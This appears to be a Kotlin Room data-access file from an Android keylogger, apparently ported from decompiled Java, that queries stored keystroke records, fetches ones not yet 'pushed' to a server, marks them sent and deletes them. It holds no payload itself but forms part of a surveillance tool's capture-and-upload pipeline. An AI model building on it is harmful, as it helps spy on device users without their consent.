package com.hawkshaw.library.datalayer.room.keylogger

import androidx.room.*
import kotlinx.coroutines.flow.Flow
import com.hawkshaw.library.datalayer.room.BaseDao // Import your BaseDao

/**
 * Data Access Object for keylogger entries
 */
@Dao
interface KeyloggerDao : BaseDao<KeyLogEntity> { // Now correctly extends your BaseDao

    /**
     * Get all keylog entries.
     * Corresponds to `Object getAll(e eVar)` in the Java version.
     * Returns a Flow for reactive data streams.
     * @return Flow of list of all keylog entries
     */
    @Query("SELECT * FROM keylogger ORDER BY timestamp DESC")
    fun getAll(): Flow<List<KeyLogEntity>> // Renamed from getAllLogs to getAll for consistency with Java

    /**
     * Get unpushed keylog entries
     * @return Flow of list of unpushed keylog entries
     */
    @Query("SELECT * FROM keylogger WHERE pushed = 0 ORDER BY timestamp ASC")
    fun getUnpushedLogs(): Flow<List<KeyLogEntity>>

    // The insert, update, delete, etc., methods are now inherited directly from BaseDao.
    // They are non-suspend in BaseDao, meaning you'd wrap their calls in Dispatchers.IO.
    // Example: withContext(Dispatchers.IO) { keyloggerDao.insert(log) }

    /**
     * Delete all pushed keylog entries
     * @return The number of rows deleted
     */
    @Query("DELETE FROM keylogger WHERE pushed = 1")
    suspend fun deletePushedLogs(): Int // Keep as suspend as it's a specific write operation

    /**
     * Mark a keylog entry as pushed
     * @param id The ID of the keylog entry to mark as pushed
     */
    @Query("UPDATE keylogger SET pushed = 1 WHERE id = :id")
    suspend fun markAsPushed(id: Long) // Keep as suspend

    /**
     * Deletes all entries from the keylogger table.
     * Corresponds to `Object nukeTable(e eVar)` in the Java version.
     * @return The number of rows deleted.
     */
    @Query("DELETE FROM keylogger")
    suspend fun nukeTable(): Int // Make suspend for proper coroutine handling of DB operation
}